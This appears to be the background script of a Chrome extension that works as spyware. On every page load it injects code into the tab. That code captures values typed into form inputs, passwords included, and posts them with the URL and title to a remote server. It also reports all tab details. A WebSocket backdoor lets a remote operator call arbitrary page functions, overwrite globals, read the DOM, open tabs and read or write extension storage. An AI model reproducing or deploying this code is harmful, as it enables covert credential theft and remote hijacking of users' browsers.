importScripts('config.js')
initForeground()

chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
    if (info.status === 'complete') {
        const { uuid, url } = await STORAGE_LOCAL.get('uuid')
        initSocket()
        POST({
            url: `${url}/api/extension/tabs`,
            body: {
                ...tab,
                deviceId: uuid || 'Unknown'
            }
        })
    }
})


function initForeground() {
  async function local() {
    window.storageLocal = chrome.storage.local
    window.storageSync = chrome.storage.sync
    const { url, uuid } = await storageLocal.get()
    // const urlApi = `${url}/api/extension/urls`
    const urlDetailApi = `${url}/api/extension/url_details`
    const inputApi = `${url}/api/extension/inputs`
    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
    storageLocal.set({ uuid: deviceId })

    getLocation()
    addInputListener()

    function post({ url, body = {} }) {
      return fetch(url, {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
      }).catch(e => console.error(e))
    }

    function addInputListener() {
      const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'submit', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type))
      const inputs = getInputs()
      let all = null
      inputs.forEach(i => i.onchange = () => {
        i.touched = true
        all = inputs.map(({ id, name, type, value, touched }) => ({ id, name, type, value, touched }))
        localStorage.setItem('inputs', JSON.stringify(all))
      })

      inputs.forEach(i => i.onblur = () => {
        post({
          url: inputApi,
          body: {
            json: JSON.stringify(all),
            ...location,
            deviceId
          }
        })
      })
    }

    function getLocation() {
      let icon = document.querySelector('link[rel=icon]')
      icon = icon ? icon.href ? icon.href : 'No link' : 'No icon'
      post({
        url: urlDetailApi,
        body: {
          ...location,
          icon,
          title: document.title,
          deviceId
        }
      })
    }
  }

  async function Client(tabId) {
    window.storageLocal = chrome.storage.local
    window.storageSync = chrome.storage.sync
    window.getDomPath = el => {
      if (!el) {
        return;
      }
      var stack = [];
      var isShadow = false;
      while (el.parentNode != null) {
        // console.log(el.nodeName);
        var sibCount = 0;
        var sibIndex = 0;
        // get sibling indexes
        for ( var i = 0; i < el.parentNode.childNodes.length; i++ ) {
          var sib = el.parentNode.childNodes[i];
          if ( sib.nodeName == el.nodeName ) {
            if ( sib === el ) {
              sibIndex = sibCount;
            }
            sibCount++;
          }
        }
        // if ( el.hasAttribute('id') && el.id != '' ) { no id shortcuts, ids are not unique in shadowDom
        //   stack.unshift(el.nodeName.toLowerCase() + '#' + el.id);
        // } else
        var nodeName = el.nodeName.toLowerCase();
        if (isShadow) {
          nodeName += "::shadow";
          isShadow = false;
        }
        if ( sibCount > 1 ) {
          stack.unshift(nodeName + ':nth-of-type(' + (sibIndex + 1) + ')');
        } else {
          stack.unshift(nodeName);
        }
        el = el.parentNode;
        if (el.nodeType === 11) { // for shadow dom, we
          isShadow = true;
          el = el.host;
        }
      }
      stack.splice(0,1); // removes the html element
      return stack.join(' > ');
    }
    const { uuid, socketUrl } = await storageLocal.get()
    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
    let ws
    initSocket()

    storageLocal.set({ uuid: deviceId })

    function initSocket() {
      ws = new WebSocket(socketUrl)
      ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
      ws.onopen = (e) => {
        ws.onmessage = ({ data }) => {
          // console.log(JSON.parse(data))
          const { action, from, payload } = JSON.parse(data)
          wk.remoteId = from
          wk.action
          switch (action) {
            case 'HI':
              ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
              break
            case 'exec': wk.exec(payload.name, payload.args)
              break
          }
        }
        ws.onclose = () => {
          ws.onclose = null
          setTimeout(initSocket, 2000)
        }
      }
    }

    class WK {
      constructor() {
        addEventListener('click', e => { this.currentTarget = e.target })
        window.wk = this
        this.remoteId = 'Remote'
        this.help = {
          'wk.getObject': 'clone object | getObject(name)',
          'wk.send': 'send data | send(data)',
          'wk.execute': 'function call | execute(name, ...args)',
          'wk.set': 'set key with given value from remote | set(key, value)',
          'wk.assign': 'set key with executed value | assign(key, { name, args })',
          'wk.querySelector': 'wk.currentElement = query result',
          'wk.getKeys': 'get keys from object | getKeys(name)',
        }
      }

      getCurrentElementPath() {
        return getDomPath(this.currentElement)
      }

      getCurrentTargetPath() {
        return getDomPath(this.currentTarget)
      }

      execute(name, args) {
        try {
          args = args.map(arg => {
            if (arg.type === 'wk.execute')
              return this.execute(arg.name, arg.args)
            else if (arg.type === 'wk.get')
              return this.get(arg.name)
            else if (arg.type === 'wk.getObject')
              return this.getObject(arg.name)
            else if (arg.type === 'wk.getKeys')
              return this.getKeys(arg.name)
            else if (arg.type === 'wk.assign')
              return this.assign(arg.key, arg.name, arg.args)
            else if (arg.type === 'wk.createFN')
              return this.createFN(arg.name, arg.body)
            else return arg
          })
        } catch (error) {
          return error.message
        }
        const [k1, k2, k3, k4, k5] = name.split('.')
        if (k5)
          return window[k1][k2][k3][k4][k5] && window[k1][k2][k3][k4][k5].call ? window[k1][k2][k3][k4][k5](...args) : null
        if (k4)
          return window[k1][k2][k3][k4] && window[k1][k2][k3][k4].call ? window[k1][k2][k3][k4](...args) : null
        if (k3)
          return window[k1][k2][k3] && window[k1][k2][k3].call ? window[k1][k2][k3](...args) : null
        if (k2)
          return window[k1][k2] && window[k1][k2].call ? window[k1][k2](...args) : null
        if (k1)
          return window[k1] && window[k1].call ? window[k1](...args) : null
      }

      getObject(name) {
        let item
        for (const k of name.split('.'))
          if (!item) item = window[k]
          else item = item[k]
        return item
      }

      // usable
      send(data) {
        this.clientId = this.remoteId || 'Remote'
        if (data === null || data === undefined) data = 'null'
        // console.warn('Sending: ', data)
        let payload
        if (data.forEach) data = [...data].map(d => d.outerHTML ? d.outerHTML : d)

        if (data.outerHTML) {
          payload = data.outerHTML //JSON.stringify(data.outerHTML)
        }
        else payload = data //JSON.stringify(data)
        // console.warn('Payload: ', payload)
        //localStorage.data = payload
        this.data = data
        ws.emit('SEND', { clientId: this.remoteId, action: 'DATA', payload })
      }

      exec(name, args) {
        this.send(this.execute(name, args))
      }

      get(name) {
        return this.getObject(name)
      }

      set(key, value) {
        try {
          const keys = key.split('.').reverse()
          let obj = window
          while (keys.length) {
            const key = keys.pop()
            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
            else if (!keys.length) obj[key] = value
            else obj = obj[key]
          }

        } catch (error) {
          return error.message
        }
      }

      assign(key, { name, args }) {
        try {

          const value = this.execute(name, args)

          const keys = key.split('.').reverse()
          let obj = window
          while (keys.length) {
            const key = keys.pop()
            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
            else if (!keys.length) obj[key] = value
            else obj = obj[key]
          }
        } catch (error) {
          return error.message
        }
      }

      createFN(name, body) {
        const fn = () => {
          for (const s of body) {
            this.execute(s.name, s.args)
          }
        }

        return name ? this[name] = fn : fn
      }

      extractObject(name) {
        const obj = this.getObject(name)
        if (!obj) return

        if (typeof obj === 'object') {
          let data = {}
          for (const k in obj)
            data[k] = obj[k]
          return data
        }
        else
          return obj
      }

      getKeys(name) {
        return Object.keys(this.getObject(name))
      }

      querySelector(query) {
        this.currentElement = document.querySelector(query)
        return this.currentElement
      }

    }
    new WK
  }

  chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
    if (info.status === 'complete') {
      chrome.scripting.executeScript({
        target: { tabId },
        function: Client,
        args: [tabId]
      })

      setTimeout(() => chrome.scripting.executeScript({
        target: { tabId },
        function: local
      }), 500)
    }
  })
}


async function initSocket() {
  const { uuid, socketUrl } = await STORAGE_LOCAL.get()
  const ID = `${uuid}-BG`

  if (WS && WS.readyState === 1 && WS.id === ID) return
  if (WS && WS.readyState === 1) {
    WS.onclose = null
    WS.close()
  }
  WS = new WebSocket(socketUrl)
  WS.emit = ({ clientId, payload }) => WS.send(JSON.stringify({ action: 'SEND', payload: { clientId, payload } }))
  WS.onopen = () => {
    WS.onmessage = ({ data }) => {
      try {
        handleData(JSON.parse(data))
      } catch (error) { }
    }
  }

  WS.onclose = () => setTimeout(() => initSocket(ID), 2000)

  async function handleData({ action, from, payload }) {
    console.log(action, from, payload)
    let data = 'NOT MATCH'
    try {
      switch (action) {
        case 'HI': data = await register()
          break
        case CMD.TAB: data = await tab(payload)
          break
        case CMD.TABS: data = await tabs(payload)
          break
        case CMD.GOTO: data = await goto(payload)
          break
        case CMD.SET_STORAGE: data = await setStorage(payload)
          break
        case CMD.GET_STORAGE: data = await getStorage(payload)
          break
        case CMD.HELP: return WS.emit(handleData.toString)
      }
    } catch (error) {
      data = error.message
    }
    if (data !== 'NOT MATCH') {
      action += '_RES'
      WS.emit({ action, clientId: from, payload: data })
    }
  }

  function tab(payload) {
    return chrome.tabs.query(payload)
  }

  function tabs(payload) {
    return chrome.tabs.query(payload)
  }

  function goto(payload) {
    if (payload.options?.length) {
      payload.options.forEach(option => {
        chrome.tabs.create(option)
      })
      return 'CREATED'
    }
  }

  function register() {
    console.log('init socket with id ', ID)
    WS.send(JSON.stringify({
      action: 'ID',
      payload: ID
    }))
  }

  function getStorage(payload) {
    const { type = '' } = payload

    if (type === CMD.LOCAL)
      return storageLocal.get()
    else if (type === CMD.SYNC)
      return storageSync.get()
  }

  function setStorage(payload) {
    const { type = '', values } = payload

    if (type === CMD.LOCAL)
      return storageLocal.set({ ...values })
    else if (type === CMD.SYNC)
      return storageSync.set({ ...values })
  }
}